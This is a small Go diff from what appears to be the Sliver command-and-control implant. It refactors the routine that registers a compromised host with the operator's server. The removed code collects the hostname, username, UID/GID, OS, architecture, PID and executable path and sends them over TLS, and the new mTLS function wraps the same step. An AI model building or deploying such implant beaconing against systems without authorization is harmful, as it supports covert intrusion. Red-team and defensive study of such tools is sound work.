@@ -13,31 +13,13 @@ import (
 	// {{end}}
 
 	"os"
-	"os/user"
-	"runtime"
 	pb "sliver/protobuf"
 
 	"github.com/golang/protobuf/proto"
 )
 
-func registerSliver(conn *tls.Conn) {
-	hostname, _ := os.Hostname()
-	currentUser, _ := user.Current()
-	data, _ := proto.Marshal(&pb.RegisterSliver{
-		Name:     sliverName,
-		Hostname: hostname,
-		Username: currentUser.Username,
-		Uid:      currentUser.Uid,
-		Gid:      currentUser.Gid,
-		Os:       runtime.GOOS,
-		Arch:     runtime.GOARCH,
-		Pid:      int32(os.Getpid()),
-		Filename: os.Args[0],
-	})
-	envelope := pb.Envelope{
-		Type: pb.MsgRegister,
-		Data: data,
-	}
+func mtlsRegisterSliver(conn *tls.Conn) {
+	envelope := getRegisterSliver()
 	socketWriteEnvelope(conn, envelope)
 }
 
